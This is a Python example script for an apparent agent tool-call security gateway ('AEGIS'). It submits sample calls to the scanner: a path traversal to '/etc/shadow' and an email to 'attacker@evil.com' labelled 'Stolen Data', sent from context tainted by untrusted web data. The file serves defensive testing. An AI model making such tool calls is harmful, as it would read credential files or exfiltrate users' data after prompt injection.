"""Example 03: Autonomous Agent Tool Execution Safety Guard.

Demonstrates verifying agent tool calls with AEGIS to stop path traversal,
unauthorized email exfiltration, and context taint escalation.
"""

from __future__ import annotations

import sys
from pathlib import Path

# Add repo to pythonpath for local development
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "aegis_client"))

from aegis_client import AegisClient


def main() -> None:
    print("=" * 60)
    print("AEGIS Example 03: Agent Tool Call Capability Policy Guard")
    print("=" * 60)

    # Initialize client (points to AEGIS Gateway)
    client = AegisClient(base_url="http://localhost:8000")

    # 1. Test safe tool call
    print("\n1. Testing safe internal email tool invocation:")
    try:
        dec1 = client.scan_tool_call(
            tool_name="send_email",
            arguments={
                "to": "security@company.com",
                "subject": "Audit Report",
                "body": "Clean text",
            },
            is_tainted=False,
        )
        print(f"Result: Allowed={dec1.allowed} | Reason: {dec1.reason}")
    except Exception as ex:
        print(f"Connection notice (start gateway to test live): {ex}")

    # 2. Test path traversal exploit
    print("\n2. Testing path traversal attack in file reader tool:")
    try:
        dec2 = client.scan_tool_call(
            tool_name="read_file",
            arguments={"path": "../../../../etc/shadow"},
            is_tainted=False,
        )
        print(f"Result: Allowed={dec2.allowed} | Reason: {dec2.reason}")
    except Exception as ex:
        print(f"Connection notice: {ex}")

    # 3. Test context taint escalation (untrusted web data attempting to trigger email)
    print("\n3. Testing high-risk tool call with tainted context:")
    try:
        dec3 = client.scan_tool_call(
            tool_name="send_email",
            arguments={"to": "attacker@evil.com", "subject": "Stolen Data", "body": "Leaks"},
            is_tainted=True,  # Context was influenced by untrusted RAG or web search
        )
        print(f"Result: Allowed={dec3.allowed} | Reason: {dec3.reason}")
    except Exception as ex:
        print(f"Connection notice: {ex}")


if __name__ == "__main__":
    main()
